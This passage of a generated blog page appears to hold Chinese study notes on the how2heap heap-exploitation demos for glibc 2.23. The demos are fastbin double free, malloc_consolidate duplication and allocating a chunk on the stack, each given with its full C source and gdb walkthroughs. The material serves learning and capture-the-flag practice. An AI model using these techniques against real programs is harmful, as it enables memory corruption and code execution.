+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="其他赛事"
+        id="heading-cc195e58b34754a13fcd0d59c782bfee" role="tab" data-toggle="collapse" href="#collapse-cc195e58b34754a13fcd0d59c782bfee"
+        aria-expanded="false"
+      >
+        其他赛事
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-cc195e58b34754a13fcd0d59c782bfee"
+           role="tabpanel" aria-labelledby="heading-cc195e58b34754a13fcd0d59c782bfee">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/12/imported-fmt_cache/" title="fmt_cache（格式化字符串 + FILE IO 缓存残留）"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">fmt_cache（格式化字符串 + FILE IO 缓存残留）</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="单身杯"
+        id="heading-d62b9de8d540cf14d74f54922367027e" role="tab" data-toggle="collapse" href="#collapse-d62b9de8d540cf14d74f54922367027e"
+        aria-expanded="false"
+      >
+        单身杯
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-d62b9de8d540cf14d74f54922367027e"
+           role="tabpanel" aria-labelledby="heading-d62b9de8d540cf14d74f54922367027e">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-8350d48a-e9e857/" title="单身杯"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">单身杯</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HOW2HEAP</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <!-- 本文件由 tools/sync_notes.py 生成，请勿手动编辑；改 notes/ 里的源笔记后重新同步 -->
+<!-- sync-source: notes/external/typora-pwn/pwn题目.md#8 -->
+<h2 id="2-23（部分）"><a href="#2-23（部分）" class="headerlink" title="2.23（部分）"></a>2.23（部分）</h2><h2 id="fastbin-dump"><a href="#fastbin-dump" class="headerlink" title="fastbin_dump"></a>fastbin_dump</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Allocating 3 buffers.\n&quot;</span>);<br>  <span class="hljs-type">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>  <span class="hljs-type">int</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>  <span class="hljs-type">int</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, a);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, b);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(8): %p\n&quot;</span>, c);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(a);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);<br>  <span class="hljs-comment">// free(a);</span><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);<br>  <span class="hljs-built_in">free</span>(b);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);<br>  <span class="hljs-built_in">free</span>(a);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);<br>  a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>  b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>  c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, a);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, b);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(8): %p\n&quot;</span>, c);<br><br>  assert(a == c);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其实就只是double基于fastbin机制下的</p>
+<p>gdb调一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -g -O0 -o double_free fastbin_dup.c<br></code></pre></td></tr></table></figure>
+
+<p><img src="/pwn-notes/images/notes/image-20261027183522092.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027183522092"></p>
+<p>申请一个堆块之后是这样的接下来申请完</p>
+<p><img src="/pwn-notes/images/notes/image-20261027183627665.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027183627665"></p>
+<p>删除a</p>
+<p><img src="/pwn-notes/images/notes/image-20261027183748075.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027183748075"></p>
+<p>删除b</p>
+<p><img src="/pwn-notes/images/notes/image-20261027183851996.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027183851996"></p>
+<p>再次删除a</p>
+<p><img src="/pwn-notes/images/notes/image-20261027183934946.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027183934946"></p>
+<p>a被释放两次，a此时又变成了头部</p>
+<p>此时也是变成了环，这就形成了double free</p>
+<p>接下来申请</p>
+<p><img src="/pwn-notes/images/notes/image-20261027184708700.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027184708700"></p>
+<p>确实，申请两次之后，确实里面确实还是原本b指向的a堆块的地址</p>
+<p><img src="/pwn-notes/images/notes/image-20261027184957833.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027184957833"></p>
+<p><img src="/pwn-notes/images/notes/image-20261027185638062.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027185638062"></p>
+<p>可以看到a和c所指向的地址一样</p>
+<p>这就是double达到的效果</p>
+<p>Fastbin Double Free 是通过打破 <code>fasttop</code> 检查，在 Fastbin 单链表中制造<strong>环</strong>，从而实现<strong>同一块内存被多次分配（UAF）</strong>，最终达到劫持 <code>fd</code> 指针、实现<strong>任意地址分配（Arbitrary Alloc）</strong>的目的。</p>
+<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -g -O0 -o 1 1.c<br></code></pre></td></tr></table></figure>
+
+<p>源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Original reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">This document is mostly used to demonstrate malloc_consolidate and how it can be leveraged with a</span><br><span class="hljs-comment">double free to gain two pointers to the same large-sized chunk, which is usually difficult to do </span><br><span class="hljs-comment">directly due to the previnuse check.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">malloc_consolidate(https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4714) essentially</span><br><span class="hljs-comment">merges all fastbin chunks with their neighbors, puts them in the unsorted bin and merges them with top</span><br><span class="hljs-comment">if possible.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">As of glibc version 2.35 it is called only in the following five places:</span><br><span class="hljs-comment">1. _int_malloc: A large sized chunk is being allocated (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3965)</span><br><span class="hljs-comment">2. _int_malloc: No bins were found for a chunk and top is too small (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4394)</span><br><span class="hljs-comment">3. _int_free: If the chunk size is &gt;= FASTBIN_CONSOLIDATION_THRESHOLD (65536) (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4674)</span><br><span class="hljs-comment">4. mtrim: Always (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5041)</span><br><span class="hljs-comment">5. __libc_mallopt: Always (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5463)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">We will be targeting the first place, so we will need to allocate a chunk that does not belong in the </span><br><span class="hljs-comment">small bin (since we are trying to get into the &#x27;else&#x27; branch of this check: https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3901). </span><br><span class="hljs-comment">This means our chunk will need to be of size &gt;= 0x400 (it is thus large-sized).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication of a large-sized chunk\n&quot;</span>);<br><br>  <span class="hljs-type">void</span>* p1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x40</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocate a fastbin chunk p1=%p \n&quot;</span>, p1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing p1 will add it to the fastbin.\n\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(p1);<br><br>    <span class="hljs-type">void</span>* p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;To trigger malloc_consolidate we need to allocate a chunk with large chunk size (&gt;= 0x400)\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;which corresponds to request size &gt;= 0x3f0. We will request 0x400 bytes, which will gives us\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a chunk with chunk size 0x410. p3=%p\n&quot;</span>, p3);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nmalloc_consolidate will merge the fast chunk p1 with top.\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p3 is allocated from top since there is no bin bigger than it. Thus, p1 = p3.\n&quot;</span>);<br><br>  assert(p1 == p3);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We will double free p1, which now points to the 0x410 chunk we just allocated (p3).\n\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p1); <span class="hljs-comment">// vulnerability</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;So p1 is double freed, and p3 hasn&#x27;t been freed although it now points to the top, as our\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chunk got consolidated with it. We have thus achieved UAF!\n&quot;</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We will request a chunk of size 0x400, this will give us a 0x410 chunk from the top\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p3 and p1 will still be pointing to it.\n&quot;</span>);<br>  <span class="hljs-type">void</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br><br>  assert(p4 == p3);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We now have two pointers (p3 and p4) that haven&#x27;t been directly freed\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;and both point to the same large-sized chunk. p3=%p p4=%p\n&quot;</span>, p3, p4);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We have achieved duplication!\n\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>看介绍似乎也是实现一个双指的作用，先申请一个小的之后释放掉，之后再申请一个大的，触发相关机制，fastbin中的与topchunk合并，使得再次分配的时候就会使得大堆块的内存地址与一开始申请的小的相同。</p>
+<p>然后free小的指针，然后大的chunk就会被释放，之后再次申请大chunk，这次申请的地址就会和上一次申请的大chunk地址相同。从而实现双指。</p>
+<p>有什么用？</p>
+<p><img src="/pwn-notes/images/notes/image-20261027194200212.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027194200212"></p>
+<p>调试：</p>
+<p>申请小堆0x40</p>
+<p><img src="/pwn-notes/images/notes/image-20261027194637072.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027194637072"></p>
+<p>接下来先释放这个堆块进入fastbin</p>
+<p><img src="/pwn-notes/images/notes/image-20261027194826915.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027194826915"></p>
+<p>接下来申请大堆块</p>
+<p><img src="/pwn-notes/images/notes/image-20261027194916118.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027194916118"></p>
+<p>可以看到和一开始申请的小堆块地址一样</p>
+<p><img src="/pwn-notes/images/notes/image-20261027195013744.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027195013744"></p>
+<p>接下来再释放p1</p>
+<p><img src="/pwn-notes/images/notes/image-20261027195129358.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027195129358"></p>
+<p>释放完之后居然哪个bin也没有进入吗？</p>
+<p><img src="/pwn-notes/images/notes/image-20261027195623280.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027195623280"></p>
+<p>行。然后再次申请大堆块，好像不管申请什么，都会获得一开始的地址</p>
+<p><img src="/pwn-notes/images/notes/image-20261027195807843.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027195807843"></p>
+<p><img src="/pwn-notes/images/notes/image-20261027195921605.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027195921605"></p>
+<p>三个指针都指向开头</p>
+<p>这个还是大的堆块，释放后还是会与topchunk合并。</p>
+<p>行吧，起码知道还能这样。</p>
+<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p>这是写入栈中吗？（似乎是先将返回地址写入fd，之后直接篡改返回地址指向后门函数什么的）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span><br>         <span class="hljs-string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);<br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> stack_var;<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, <span class="hljs-number">8</span>+(<span class="hljs-type">char</span> *)&amp;stack_var);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Allocating 3 buffers.\n&quot;</span>);<br>  <span class="hljs-type">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>  <span class="hljs-type">int</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>  <span class="hljs-type">int</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, a);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, b);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(8): %p\n&quot;</span>, c);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(a);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);<br>  <span class="hljs-comment">// free(a);</span><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);<br>  <span class="hljs-built_in">free</span>(b);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);<br>  <span class="hljs-built_in">free</span>(a);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span><br>    <span class="hljs-string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, d);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span><br>    <span class="hljs-string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span><br>    <span class="hljs-string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span><br>    <span class="hljs-string">&quot;return a pointer to it.\n&quot;</span>, a);<br>  stack_var = <span class="hljs-number">0x20</span>;<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);<br>  *d = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>) (((<span class="hljs-type">char</span>*)&amp;stack_var) - <span class="hljs-keyword">sizeof</span>(d));<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>服了，一直给我讲伪造堆块的size字段，讲为什么-8啥的，真服了。直接调</p>
+<p>首先就是构造double free</p>
+<p><img src="/pwn-notes/images/notes/image-20261027204750354.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027204750354"></p>
+<p>首先申请3个在0x20大小范围的堆块</p>
+<p>释放a</p>
+<p><img src="/pwn-notes/images/notes/image-20261027204931085.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027204931085"></p>
+<p>之后free b之后再次free a造成double free</p>
+<p><img src="/pwn-notes/images/notes/image-20261027205028965.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027205028965"></p>
+<p>接下来d申请一个小堆块，使得和a指向同一个堆块</p>
+<p><img src="/pwn-notes/images/notes/image-20261027205148806.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027205148806"></p>
+<p><img src="/pwn-notes/images/notes/image-20261027205243894.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027205243894"></p>
+<p>接下来修改d就相当于修改a的相关结构内容了</p>
+<p><img src="/pwn-notes/images/notes/image-20261027205523134.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027205523134"></p>
+<p>还可以看到此时的fastbin链表头是chunkb</p>
+<p>而它之后有申请了一次，使得a变成链表头</p>
+<p><img src="/pwn-notes/images/notes/image-20261027205718737.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027205718737"></p>
+<p><img src="/pwn-notes/images/notes/image-20261027205743194.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027205743194"></p>
+<p>确实如此</p>
+<p>然后他之后就开始吓唬搞了</p>
+<p><img src="/pwn-notes/images/notes/image-20261027205844207.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027205844207"></p>
+<p><img src="/pwn-notes/images/notes/image-20261027210026081.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027210026081"></p>
+<p>fastbin取出的时候会检查fd指向的堆块的size字段。而现在d指向的就是a的fd字段，我们想修改这里，使得验证通过。</p>
+<p>因为是0x20 而那个地址存的值就是0x20，而一般size字段是在chunk头的+0x8字节，所以是size-0x8+0x8得到的就是0x20.</p>
+<p>那么他最终获得的是，maloc获得的是+0x10之后的，所以</p>
+<p>最后获得的就是stack_var+0x8的地址是堆块首地址</p>
+<p><img src="/pwn-notes/images/notes/image-20261027211140248.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027211140248"></p>
+<p>这是修改d之前</p>
+<p>接下来修改d指针指向的值</p>
+<p><img src="/pwn-notes/images/notes/image-20261027211242376.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027211242376"></p>
+<p>可以看到a的fd指针处的值确实被修改了</p>
+<p><img src="/pwn-notes/images/notes/image-20261027211349629.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027211349629"></p>
+<p>他后面8字节确实是0x20</p>
+<p><img src="/pwn-notes/images/notes/image-20261027211441213.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027211441213"></p>
+<p>在这里可以看到，在又一次申请堆块之后栈地址确实是被写入了</p>
+<p><img src="/pwn-notes/images/notes/image-20261027212251212.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027212251212"></p>
+<p>所以说这就是最后得到的申请的堆块吗，地址是98结尾的，之后如果这里是返回地址的话，直接篡改就行了。</p>
+<p><img src="/pwn-notes/images/notes/image-20261027212701087.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027212701087"></p>
+<p>又调一次</p>
+<p><img src="/pwn-notes/images/notes/image-20261027212728784.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027212728784"></p>
+<p><img src="/pwn-notes/images/notes/image-20261027212748094.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027212748094"></p>
+<p>接下来e指向的就是那个地址</p>
+<p><img src="/pwn-notes/images/notes/image-20261027212833357.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027212833357"></p>
+<p><img src="/pwn-notes/images/notes/image-20261027212922598.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261027212922598"></p>
+<p>确实是申请到了栈地址</p>
